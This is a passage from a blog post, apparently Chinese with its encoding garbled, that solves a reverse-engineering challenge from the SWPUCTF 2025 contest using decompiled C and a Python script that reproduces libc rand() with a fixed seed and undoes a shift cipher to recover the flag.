<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_126B</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; *(_BYTE *)(i + a1) == *(_BYTE *)(i + a2); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::ostream::operator&lt;&lt;();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>æ‹‰èƒ½è·‘çš„dockerå®¹å™¨ï¼ˆä¸€æ¬¡æ€§å®¹å™¨ï¼‰ï¼š</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it \</span><br><span class="line">  -v <span class="string">"<span class="variable">$PWD</span>:/work"</span> \</span><br><span class="line">  -w /work \</span><br><span class="line">  python:3.13 \</span><br><span class="line">  bash</span><br></pre></td></tr></tbody></table></figure>

<p>æœ€ç»ˆè§£é¢˜è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> CDLL, c_uint</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">b"XLVGSD{mfbuha_sstgpr_9d_acc_wbi}"</span>  <span class="comment"># 32 bytes</span></span><br><span class="line">SEED = <span class="number">0xABC</span>  <span class="comment"># 2748</span></span><br><span class="line"></span><br><span class="line">libc = CDLL(<span class="string">"libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_v4</span>(<span class="params">seed: <span class="built_in">int</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    libc.srand(c_uint(seed))</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(libc.rand() % <span class="number">255</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward_transform</span>(<span class="params">inp: <span class="built_in">bytes</span>, v4: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    out = <span class="built_in">bytearray</span>(inp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        c = out[i]</span><br><span class="line">        v = v4[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="number">97</span> &lt;= c &lt;= <span class="number">122</span>:        <span class="comment"># a-z</span></span><br><span class="line">            out[i] = ((c - <span class="number">97</span> + (v % <span class="number">26</span>)) % <span class="number">26</span>) + <span class="number">97</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">65</span> &lt;= c &lt;= <span class="number">90</span>:       <span class="comment"># A-Z</span></span><br><span class="line">            out[i] = ((c - <span class="number">65</span> - (v % <span class="number">26</span>) + <span class="number">26</span>) % <span class="number">26</span>) + <span class="number">65</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">48</span> &lt;= c &lt;= <span class="number">57</span>:       <span class="comment"># 0-9</span></span><br><span class="line">            out[i] = ((c - <span class="number">48</span> + (v % <span class="number">10</span>)) % <span class="number">10</span>) + <span class="number">48</span></span><br><span class="line">        <span class="keyword">else</span>:                     <span class="comment"># others unchanged</span></span><br><span class="line">            out[i] = c</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_char</span>(<span class="params">out_c: <span class="built_in">int</span>, v: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="comment"># è¿™é‡ŒæŒ‰â€œè¾“å‡ºå­—ç¬¦ç±»å‹â€æ¥å›æ¨ï¼Œé€šå¸¸é¢˜ç›®ä¼šè®©ç±»å‹ä¿æŒä¸€è‡´ï¼ˆå­—æ¯è¿˜æ˜¯å­—æ¯ã€æ•°å­—è¿˜æ˜¯æ•°å­—ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">97</span> &lt;= out_c &lt;= <span class="number">122</span>:        <span class="comment"># output is lowercase</span></span><br><span class="line">        <span class="keyword">return</span> ((out_c - <span class="number">97</span> - (v % <span class="number">26</span>)) % <span class="number">26</span>) + <span class="number">97</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">65</span> &lt;= out_c &lt;= <span class="number">90</span>:         <span class="comment"># output is uppercase</span></span><br><span class="line">        <span class="keyword">return</span> ((out_c - <span class="number">65</span> + (v % <span class="number">26</span>)) % <span class="number">26</span>) + <span class="number">65</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">48</span> &lt;= out_c &lt;= <span class="number">57</span>:         <span class="comment"># output is digit</span></span><br><span class="line">        <span class="keyword">return</span> ((out_c - <span class="number">48</span> - (v % <span class="number">10</span>)) % <span class="number">10</span>) + <span class="number">48</span></span><br><span class="line">    <span class="keyword">return</span> out_c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_input</span>(<span class="params">target: <span class="built_in">bytes</span>, v4: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    rec = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        rec[i] = invert_char(target[i], v4[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(rec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    v4 = gen_v4(SEED)</span><br><span class="line">    candidate = recover_input(TARGET, v4)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"seed:"</span>, SEED)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"recovered input:"</span>, candidate.decode(errors=<span class="string">"replace"</span>))</span><br><span class="line"></span><br><span class="line">    check = forward_transform(candidate, v4)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"check == TARGET:"</span>, check == TARGET)</span><br><span class="line">    <span class="keyword">if</span> check != TARGET:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"check bytes:"</span>, check)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://a1.boltp.com/2026/02/01/697f3bcbb8886.png" alt="å¾—åˆ°flag"></p>
<hr>
<p>ç¯‡å°¾ï¼š<br>âœ¨<br>æ¬£èµä¸€ä¸‹èŠ±äº†ä¸€äº›æ—¶é—´åšçš„ç¾ä¸½gif</p>
<p><img src="https://a1.boltp.com/2026/02/01/697f23155a9e7.gif" alt="æŸåŠ¨æ€å£çº¸"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://sereniusx.github.io">SereniusX</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://sereniusx.github.io" target="_blank">SereniusXçš„åšå®¢</a>ï¼</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/" title="CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›3</div></div><div class="info-2"><div class="info-item-1">é¢˜ç›®æ¥æºï¼šNSSCTF ç»ƒä¹ æ—¶é—´ï¼š2026å¹´2æœˆ2æ—¥ ç»ƒä¹ æ•°é‡ï¼š5 ä¸Šç¯‡ï¼šCTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2 ğŸ“– SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›åˆé›†ï¼š1ï¸âƒ£CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›12ï¸âƒ£CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›23ï¸âƒ£CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›3 â­ï¸ 08 [SWPUCTF 2025 ç§‹...</div></div></div></a><a class="pagination-related" href="/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/" title="CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›1</div></div><div class="info-2"><div class="info-item-1">é¢˜ç›®æ¥æºï¼šNSSCTF ç»ƒä¹ æ—¶é—´ï¼š2026å¹´1æœˆ31æ—¥ ç»ƒä¹ æ•°é‡ï¼š2 â­ï¸ 01 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]â€jâ€wtğŸš©flagï¼šNSSCTF{18a9770a-1881-4d6c-bc97-10cef8f39967} ğŸ’¡hintï¼šjava jwt JARåç¼–è¯‘ JAVAå®¡è®¡ JWTä¼ªé€  ğŸ”§toolï¼šjadx-gui www.jwt...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">SereniusX</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sereniusx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-03-SWPUCTF-2025-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E4%B8%80%E7%A7%8D%E5%BE%88%E6%96%B0%E7%9A%84%E7%AD%BE%E5%88%B0"><span class="toc-text">â­ï¸ 03 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]ä¸€ç§å¾ˆæ–°çš„ç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-04-SWPUCTF-2025-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-FIRST-MEETING"><span class="toc-text">â­ï¸ 04 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]FIRST MEETING</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-05-SWPUCTF-2025-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-Are-u-%E2%80%9C%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E2%80%9D%EF%BC%9F"><span class="toc-text">â­ï¸ 05 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]Are u â€œè„šæœ¬å°å­â€ï¼Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-06-SWPUCTF-2025-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E6%9C%AA%E5%AE%8C%E7%9A%84%E6%95%85%E4%BA%8B"><span class="toc-text">â­ï¸ 06 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]æœªå®Œçš„æ•…äº‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-07-SWPUCTF-2025-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-debuggggg"><span class="toc-text">â­ï¸ 07 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]debuggggg</span></a></li></ol></div></div><div class="card-widget card-post-series"><div class="item-headline"><i class="fa-solid fa-layer-group"></i><span>CTFåˆ·é¢˜è®°å½•</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/CTF-Web%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="CTF-Webæš‘æœŸåˆ·é¢˜è®°å½•">CTF-Webæš‘æœŸåˆ·é¢˜è®°å½•</a><time datetime="2026-01-31T08:52:12.000Z" title="å‘è¡¨äº 2026-01-31 16:52:12">2026-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/" title="CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›4">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›4</a><time datetime="2026-02-03T14:50:17.000Z" title="å‘è¡¨äº 2026-02-03 22:50:17">2026-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/" title="CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›3">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›3</a><time datetime="2026-02-02T09:18:05.000Z" title="å‘è¡¨äº 2026-02-02 17:18:05">2026-02-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/" title="CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›2</a><time datetime="2026-02-01T03:47:37.000Z" title="å‘è¡¨äº 2026-02-01 11:47:37">2026-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/" title="CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›1">CTF-SWPUCTF2025ç§‹å­£æ–°ç”Ÿèµ›1</a><time datetime="2026-01-31T11:43:42.000Z" title="å‘è¡¨äº 2026-01-31 19:43:42">2026-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/CTF-Reverse%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="CTF-Reverseæš‘æœŸåˆ·é¢˜è®°å½•">CTF-Reverseæš‘æœŸåˆ·é¢˜è®°å½•</a><time datetime="2026-01-31T04:49:14.000Z" title="å‘è¡¨äº 2026-01-31 12:49:14">2026-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/" title="CTF-PWNæš‘æœŸåˆ·é¢˜è®°å½•">CTF-PWNæš‘æœŸåˆ·é¢˜è®°å½•</a><time datetime="2026-01-30T13:02:12.000Z" title="å‘è¡¨äº 2026-01-30 21:02:12">2026-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/CTF-Crypto%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="CTF-Cryptoæš‘æœŸåˆ·é¢˜è®°å½•">CTF-Cryptoæš‘æœŸåˆ·é¢˜è®°å½•</a><time datetime="2026-01-31T08:43:54.000Z" title="å‘è¡¨äº 2026-01-31 16:43:54">2026-01-31</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By SereniusX</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="èŠå¤©" style="display:none"><i class="fas fa-message"></i></button><a id="to_comment" href="#post-comment" title="å‰å¾€è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = {"mapping":"pathname","strict":0,"reactions_enabled":1,"emit_metadata":0,"input_position":"top","lang":"zh-CN"}

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'sereniusx/sereniusx.github.io',
      'data-repo-id': 'R_kgDOQCvQvQ',
      'data-category-id': 'DIC_kwDOQCvQvc4C1pNr',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"></script><script src="/js/post-meta.js"></script><script src="/js/bg-duotone.js"></script><script src="/js/post-meta.js"></script><script src="/js/heatmap.js"></script><script src="/js/hr-random.js"></script><script>(() => {
  window.ChatraID = 'xYpW5Meo932eB55bm'
  window.Chatra = window.Chatra || function() {
    (window.Chatra.q = window.Chatra.q || []).push(arguments)
  }

  btf.getScript('https://call.chatra.io/chatra.js').then(() => {
    const isChatBtn = true
    const isChatHideShow = true

    if (isChatBtn) {
      const close = () => {
        Chatra('minimizeWidget')
        Chatra('hide')
      }

      const open = () => {
        Chatra('openChat', true)
        Chatra('show')
      }

      window.ChatraSetup = { startHidden: true }
    
      window.chatBtnFn = () => document.getElementById('chatra').classList.contains('chatra--expanded') ? close() : open()

      document.getElementById('chat-btn').style.display = 'block'
    } else if (isChatHideShow) {
      window.chatBtn = {
        hide: () => Chatra('hide'),
        show: () => Chatra('show')
      }
    }
  })
})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>